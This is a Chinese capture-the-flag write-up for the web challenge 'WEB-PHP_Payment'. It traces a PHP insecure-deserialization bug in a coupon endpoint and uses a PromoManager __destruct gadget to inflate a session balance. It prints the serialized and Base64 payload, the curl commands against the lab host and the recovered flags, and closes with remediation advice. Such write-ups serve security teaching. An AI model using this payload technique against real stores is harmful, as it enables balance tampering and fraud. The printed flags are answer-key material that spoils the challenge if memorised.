# 极简支付 (WEB-PHP_Payment) Writeup

## 题目信息

- **题目名称**: WEB-PHP_Payment
- **题目描述**: 一个现代化的数字资产商城，买一个 Supreme Flag 需要 99999 巨款！有没有什么隐藏的 VIP 优惠券能用呢？
- **题目难度**: 初级
- **题目分类**: WEB
- **题目分值**: 250
- **靶机地址**: 120.27.146.76:13228

---

## 解题思路全过程

### 0x00 拿到源码，先看整体结构

解压 `src1.zip`，看到文件结构：

```
src1/
├── index.php          # 首页
├── buy.php            # 购买接口
├── config.php         # 配置文件
├── models.php         # 数据模型
├── app.js             # 前端逻辑
└── api/
    ├── apply_coupon.php   # 优惠券接口
    └── status.php         # 健康检查
```

这是一个典型的 PHP + 前端 JS 的商城应用。题目描述提示了两个关键信息：
- Flag 售价 **99,999**，是"巨款"
- 问有没有"隐藏的 VIP 优惠券"

所以攻击目标很明确：**找到某种方式绕过价格限制，买到 Flag**。

---

### 0x01 从入口开始追踪用户数据流

先看 `index.php`，搞清楚新用户的初始状态：

```php
// src1/index.php (第1-6行)
session_start();
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = bin2hex(random_bytes(8));
    $_SESSION['balance'] = 20; // Default 20 金币
}
```

**为什么关注这个？** 因为这是状态起点。新用户只有 20 金币，离 99,999 差了三个数量级，说明必须有一个"加钱"的机制。

接着看页面 HTML，发现了一个关键输入框（第 37 行）：

```html
<input type="text" id="couponInput" placeholder="输入 Base64 代金券">
```

**为什么这个输入框值得注意？**
1. 题目提示"有没有隐藏的 VIP 优惠券" —— 优惠券是这个输入框的功能
2. placeholder 明确写了 **"Base64 代金券"** —— 说明输入内容是 Base64 编码的某种数据
3. 这是一个用户可控的输入点，是攻击面的入口

---

### 0x02 追踪优惠券的后端处理逻辑

前端 `app.js` 告诉我们优惠券发到了哪里：

```javascript
// src1/app.js (第67-76行)
const fp = new URLSearchParams();
fp.append('coupon', b64);        // 用户输入的 Base64 字符串，参数名是 "coupon"

fetch('/api/apply_coupon.php', {  // POST 到这个接口
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: fp.toString()
})
```

**为什么先看前端？** 因为前端代码明确告诉我们：
- 请求方法：POST
- 参数名：`coupon`
- 目标接口：`/api/apply_coupon.php`
- 参数格式：原始的 Base64 字符串，不做任何额外处理

现在打开核心文件 `api/apply_coupon.php`：

```php
// src1/api/apply_coupon.php
session_start();
include '../config.php';
include '../models.php';       // ← 第4行：加载了 models.php

$couponData = $_POST['coupon'] ?? '';

// ...空值检查...

$decoded = base64_decode($couponData);    // ← 第17行：Base64 解码
// ...解码失败检查...

try {
    $promo = @unserialize($decoded);      // ← 第23行：直接反序列化！！！
    // ...
} catch (Exception $e) { /* ... */ }
```

**逐步分析这段代码的意图和问题：**

| 行号 | 代码 | 意图 | 问题 |
|------|------|------|------|
| 第4行 | `include '../models.php'` | 加载模型类，供优惠券使用 | 引入了类定义，反序列化时可以用 |
| 第17行 | `base64_decode($couponData)` | 把 Base64 输入还原为原始数据 | 原始数据是什么？用户完全可控！ |
| 第23行 | `@unserialize($decoded)` | 把数据反序列化为 PHP 对象 | **没有任何类型检查，没有 `allowed_classes` 白名单** |

**为什么 `unserialize()` 是致命的？**

PHP 的 `unserialize()` 会根据字符串内容重建任意 PHP 对象。如果：
1. 代码中定义了某个类
2. 该类有 `__destruct()`、`__wakeup()` 等魔术方法
3. 魔术方法中有危险操作

那么攻击者就可以构造对应类的序列化字符串，触发魔术方法中的危险操作。这就是 **PHP 反序列化漏洞（PHP Object Injection）**。

所以接下来的问题变为：**`models.php` 里有什么类？它的魔术方法做了什么？**

---

### 0x03 寻找 POP 链（Property-Oriented Programming Chain）

打开 `models.php`：

```php
// src1/models.php
class PromoManager {
    public $promo_credit;
    public $promo_code;

    public function __construct($code, $credit) {
        $this->promo_code = $code;
        $this->promo_credit = $credit;
    }

    function __destruct() {                              // ← 对象销毁时自动调用
        if(isset($this->promo_credit) && is_numeric($this->promo_credit)) {
            $_SESSION['balance'] += intval($this->promo_credit);  // ← 直接加钱！！！
        }
    }
}
```

**逐行分析 `__destruct()` 的逻辑：**

1. **触发时机**：`__destruct()` 是 PHP 的魔术方法，在对象被销毁时**自动调用**。反序列化出的对象在脚本结束时必然销毁，所以 **100% 会触发**。

2. **条件检查**：`isset($this->promo_credit) && is_numeric($this->promo_credit)`
   - 只要我们在序列化字符串里写了 `promo_credit` 属性，`isset` 就为 `true`
   - 只要把 `promo_credit` 设为数字（整型 `i:` 或浮点 `d:`），`is_numeric` 就为 `true`
   - **两个条件都非常容易满足，没有真正的阻挡**

3. **核心操作**：`$_SESSION['balance'] += intval($this->promo_credit)`
   - 直接对当前会话的余额做 **加法赋值**（`+=`）
   - `intval()` 把值转成整数后加上去
   - **没有任何上限检查、没有签名验证、没有权限校验**

**为什么说这是完美的 POP Gadget？**

| 要素 | 分析 |
|------|------|
| 类是否被加载 | ✅ `apply_coupon.php` 第4行 `include '../models.php'` |
| 魔术方法是否危险 | ✅ `__destruct()` 直接修改 session 余额 |
| 是否有绕过门槛 | ❌ 条件 (`isset` + `is_numeric`) 形同虚设 |
| 操作是否持久化 | ✅ session 存储在服务端，跨请求保持 |

**至此，完整的攻击链路已经清晰：**

```
用户输入 Base64 → base64_decode → unserialize → PromoManager 对象被创建
→ 脚本结束对象销毁 → __destruct() 自动触发 → $_SESSION['balance'] 被加钱
```

---

### 0x04 确认购买接口的逻辑

最后确认 `buy.php` 的购买流程，确保加钱后真能拿到 flag：

```php
// src1/buy.php
$items = [
    'basic_vip' => 10,
    'premium_vip' => 50,
    'flag' => 99999          // ← flag 确实卖 99999
];

$price = $items[$item];

if ($_SESSION['balance'] < $price) {   // ← 余额检查，够了就放行
    die(json_encode(["error" => "Insufficient funds! ..."]));
}

$_SESSION['balance'] -= $price;        // ← 扣钱

if ($item === 'flag') {
    $flag = "flag{da91f6ee9d5cceef4705fd4f8af9e3f3}";        // 本地兜底 flag
    if (file_exists('/var/www/flag.php')) {
        include '/var/www/flag.php';                           // 线上真实 flag
        if (isset($FLAG)) $flag = $FLAG;
    }
    echo json_encode([..., "message" => "... Flag is [ $flag ]"]);
}
```

**为什么这个逻辑没有额外防护？**

- 余额检查只有一个 `if ($_SESSION['balance'] < $price)`，不会质疑余额来源是否合法
- 没有检查余额增长速度是否异常
- 没有审计日志
- 余额就是普通的 session 变量，`apply_coupon.php` 和 `buy.php` 共享同一个 session

**所以只要 `$_SESSION['balance'] >= 99999`，flag 就是囊中之物。**

---

### 0x05 构造 Payload

**5.1 手写 PHP 序列化字符串**

需要构造一个 `PromoManager` 对象。PHP 序列化格式规则：

```
O:<类名长度>:"<类名>":<属性个数>:{<属性1>;<属性2>;...}
```

- 类名：`PromoManager`，长度为 12
- 属性个数：2（`promo_credit` 和 `promo_code`）
- `promo_credit`：设为 **100000**（整数），只需大于 99999
- `promo_code`：任意字符串即可，因为 `__destruct()` 根本不检查它

**为什么 `promo_credit` 选 100000？**
- flag 价格是 99999，所以至少需要 99999
- 初始余额 20，需要额外至少 99979
- 取整 100000，绰绰有余

手写序列化字符串：

```
O:12:"PromoManager":2:{s:12:"promo_credit";i:100000;s:10:"promo_code";s:4:"hack";}
```

逐段解析：

| 片段 | 含义 |
|------|------|
| `O:12:` | Object，类名 12 字符 |
| `"PromoManager"` | 类名 |
| `:2:` | 2 个属性 |
| `s:12:"promo_credit"` | 属性1名（string，12字符） |
| `i:100000` | 属性1值（integer，100000） |
| `s:10:"promo_code"` | 属性2名（string，10字符） |
| `s:4:"hack"` | 属性2值（string，4字符"hack"） |

**5.2 Base64 编码**

**为什么需要 Base64？** 因为 `apply_coupon.php` 第17行先做 `base64_decode()`，页面也提示"输入 Base64 代金券"。

```
Base64("O:12:\"PromoManager\":2:{s:12:\"promo_credit\";i:100000;s:10:\"promo_code\";s:4:\"hack\";}")
= TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6NDoiaGFjayI7fQ==
```

---

### 0x06 实施攻击

**6.1 获取 Session**

```bash
curl -c cookie.txt "http://120.27.146.76:13228/index.php"
```

**为什么第一步是获取 session？**
- PHP 的 session 机制通过 `PHPSESSID` cookie 来识别用户
- `__destruct()` 修改的是当前 session 的 `$_SESSION['balance']`
- 后续购买必须携带同一个 session，否则余额修改无效
- `-c cookie.txt` 把服务器返回的 `Set-Cookie` 保存下来

**6.2 提交恶意优惠券**

```bash
curl -b cookie.txt -c cookie.txt \
  "http://120.27.146.76:13228/api/apply_coupon.php" \
  --data-urlencode "coupon=TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6NDoiaGFjayI7fQ=="
```

**为什么用 `--data-urlencode`？**
- POST body 是 `application/x-www-form-urlencoded` 格式（`app.js` 第27行指定）
- Base64 字符串含有 `+`、`/`、`=` 等需要 URL 编码的字符
- `--data-urlencode` 自动处理编码，避免传输过程中 Base64 字符被破坏

**这一步背后发生了什么？**

```
1. PHP 收到 POST 参数 coupon=<Base64字符串>
2. base64_decode() 还原出序列化字符串
3. unserialize() 创建 PromoManager 对象，promo_credit=100000
4. echo 返回 JSON 响应 {"success":true,...}
5. 脚本结束，PromoManager 对象被销毁
6. __destruct() 自动触发
7. $_SESSION['balance'] = 20 + 100000 = 100020
8. session 数据写回服务端存储
```

返回：

```json
{"success":true,"message":"Coupon processed."}
```

**6.3 购买 Flag**

```bash
curl -b cookie.txt "http://120.27.146.76:13228/buy.php" --data-urlencode "item=flag"
```

**为什么用同一个 cookie？** 因为上一步修改的 session 余额保存在服务端，只有携带同一个 `PHPSESSID` 才能命中同一个 session。

返回：

```
flag{0afd53b56124fc6a9665268cf6024f55}
{"success":true,"message":"购买 successful! Your Flag is [ flag{0afd53b56124fc6a9665268cf6024f55} ]","balance":21}
```

**6.4 验证攻击链路完整性**

余额变化：`20 → 100020 → 21`

验算：`20 + 100000 - 99999 = 21` ✅ 完美吻合。

**为什么余额恰好是 21 这个"有零有整"的数字？**
- 如果漏洞利用失败，购买 flag 会直接报"Insufficient funds"
- 如果买成功并且余额刚好 = 初始余额(20) + 充值额(100000) - 价格(99999) = 21
- 这个精确的数字本身就是漏洞利用成功的数学证明

---

## Flag

```
flag{0afd53b56124fc6a9665268cf6024f55}
```

> 源码中硬编码的 `flag{da91f6ee9d5cceef4705fd4f8af9e3f3}` 仅在 `/var/www/flag.php` 不存在时作为兜底值。线上靶机部署了真实的 `flag.php`，因此返回的是上方真实 flag。

---

## 漏洞总结

| 维度 | 说明 |
|------|------|
| **漏洞类型** | PHP Insecure Deserialization（PHP 不安全反序列化） |
| **漏洞成因** | `api/apply_coupon.php:23` 对用户输入调用 `unserialize()` 且无任何限制 |
| **POP Gadget** | `PromoManager::__destruct()` — 对象销毁时直接修改 `$_SESSION['balance']` |
| **利用条件** | ① `models.php` 被 `apply_coupon.php` 引入（第4行）；② 用户输入直达 `unserialize()`；③ session 跨请求共享 |
| **攻击难度** | 低 — 链路短、无绕过门槛、payload 纯手工即可构造 |
| **影响** | 余额篡改 → 购买任意高价商品 → 获取 Flag |
| **修复方案** | 1. 用 `json_decode()` 替代 `unserialize()`，JSON 不携带类型信息，无法触发魔术方法<br>2. 如果必须序列化，PHP 7.0+ 可使用 `unserialize($data, ['allowed_classes' => []])` 禁用所有类<br>3. 优惠券应采用服务端签发 + HMAC 签名，让用户无法自己构造有效载荷 |
